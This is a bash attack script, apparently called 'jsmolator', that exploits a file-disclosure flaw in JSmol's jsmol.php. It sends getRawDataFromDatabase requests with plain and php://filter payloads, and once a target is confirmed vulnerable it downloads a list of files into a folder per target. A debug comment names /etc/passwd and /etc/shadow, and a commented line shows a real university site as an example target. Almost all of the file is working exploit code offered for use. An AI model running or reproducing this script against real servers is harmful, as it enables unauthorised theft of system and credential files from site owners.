#!/bin/bash
# CHORFA A.
# dino213DZ@gmail.com
# V 0.1 08.02.2020
#
#####################
#includes
script_path=$(echo "$0"|rev|cut -d '/' -f 2-|rev )
cd $script_path
source 'jsmolator.conf'
source 'jsmolator.fct'
#####################

#attack params
#jsmolphp_url='http://www.lct.jussieu.fr/pagesperso/orbimol/script/jsmol/php/jsmol.php'
jsmolphp_url="$1"
payload_txt='call=getRawDataFromDatabase&query='
payload_b64='isform=true&call=getRawDataFromDatabase&source=post_page---------------------------&query=php://filter/resource='
#debug : ligne a supprimer
#download_files='/etc/passwd /etc/shadow /etc/group'
download_files=$(cat "$dl_list_file")
total_files_to_dl=$(cat $dl_list_file|wc -l)

#working vars
continue_tests='TRUE'
is_vuln='FALSE'
payload_types=('TXT' 'B64')
functionnal_payload=''


if [ ${#1} -eq 0 ];then
	echo "$0 [http://target/uri/till/jsmol.php]"
	exit 1;
fi

#start
showBanner

#show infos
touch "$curl_output_filename"
showTitle "Attack information" "" "0"
showTitle "Target" "$jsmolphp_url" "1"

showTitle "Trying payloads" "" "0"
for target_test_filename in ${target_test_files[*]};do
	for payload_test in ${payload_types[*]};do
		#try payload 
		showTitle "Getting $target_test_filename" "Payload type $payload_test" "1"
		checkFile "$target_test_filename" "$payload_test"
	done
	if [ $continue_tests != "TRUE" ];then
		showTitle "Success" "Payload $payload_test works well!" "2"
		break
	fi
done

showTitle "Results" "" "0"
if [ $is_vuln = "TRUE" ];then
	showTitle "This shit is vulnerable!" "$c_warn""Enjoy!" "1"
	
	showTitle "Downloding files" "" "0"
	#convert target domaine to folder
	showTitle "Sub-folder check" "$dl_sub_folder" "1" "NoNL"
	dl_sub_folder=$(echo "$jsmolphp_url"|cut -d '/' -f 3)
	echo -e "Done"$c_reset
	#create download folder
	showTitle "Creating download folders" "" "1"
	if [ ! -d "$download_folder" ];then 
		showTitle "Creating" "$download_folder" "2" "NoNL"
		mkdir "$download_folder" 
		echo -e "Done"$c_reset
	else
		showTitle "Folder $download_folder" "Already exists" "2"
	fi
	if [ ! -d "$download_folder/$dl_sub_folder" ];then 
		showTitle "Creating" "$download_folder/$dl_sub_folder" "2" "NoNL"
		mkdir "$download_folder/$dl_sub_folder" 
		echo -e "Done"$c_reset
	else
		showTitle "Folder $download_folder/$dl_sub_folder" "Already exists" "2"
	fi
	#dl files	
	showTitle "Downloading files into" "$download_folder/$dl_sub_folder/" "1"
	total_files_downloaded=0
	total_files_being_dl=0
	for dl_file in ${download_files[*]};do
		total_files_being_dl=$(( $total_files_being_dl+1 ))
		dl_filename=$(echo "$dl_file"|rev|cut -d '/' -f 1|rev)
		dl_dest="$download_folder/$dl_sub_folder/$dl_filename"
		pct_dl=$(($total_files_being_dl*100/$total_files_to_dl))
		showTitle "[Progress:$c_submain$pct_dl$c_reset$c_main][downloaded:$c_submain$total_files_downloaded/$total_files_to_dl$c_reset$c_main] $dl_file" "" "2" "noNL"
		getFile "$dl_file" "$functionnal_payload" "$dl_dest"
		check_size=$(checkFileSize "$dl_dest")
		
		if [ "$check_size" != "OK" ];then
			echo -e "$c_error$check_size$c_reset"
			rm -f "$dl_dest"
		else
			total_files_downloaded=$(( $total_files_downloaded+1 ))
			echo -e "$c_text$check_size$c_reset"
		fi
	done
	#listing downloaded files
	showTitle "Listing downloaded files" "" "1"
	#ls -Al "$download_folder/$dl_sub_folder/"|tail -n +2|egrep -v "^[[space]]*"|sed "s/^/    | /g"
	filelist=$(ls -A "$download_folder/$dl_sub_folder/")
	for fl in $(echo "$filelist");do
		showTitle "$fl" "" "2" ""
		showTitle "Filesize" "$filesize" "3" "NoNL"
		echo ""$(stat -c%s "$download_folder/$dl_sub_folder/$fl")" octets"
		showTitle "Tag search" "" "3" ""
		for tg in ${tags_checklist[*]};do
			check_tag=$(cat "$download_folder/$dl_sub_folder/$fl" | grep -n "$tg")
			if [ ${#check_tag} -gt 0 ];then 
				showTitle "$tg tag" "$c_main" "4" "noNL"
				#echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}\\$c_text/g"|sed "s/  /#@§/g")|sed "s/#@§/  /g"
				echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}line \\$c_text/g"|sed "s/  /#@§/g")|sed "s/#@§/  /g"
			fi
		done
	done
	
	showTitle "Check this before quitting" "" "1" "noNL"
	#debug pause	
	read pause
else
	showTitle "This shit is not vulnerable!" "$c_error""Game over!" "1"
fi
#end
showTitle "Quitting" "" "0"
showTitle "Remove temporary files" "" "1"
rm -f "$curl_output_filename" 2>/dev/null 1>/dev/null
cd $OLDPATH
showTitle "Bye" "" "1"
echo -en "$c_reset"
exit 0
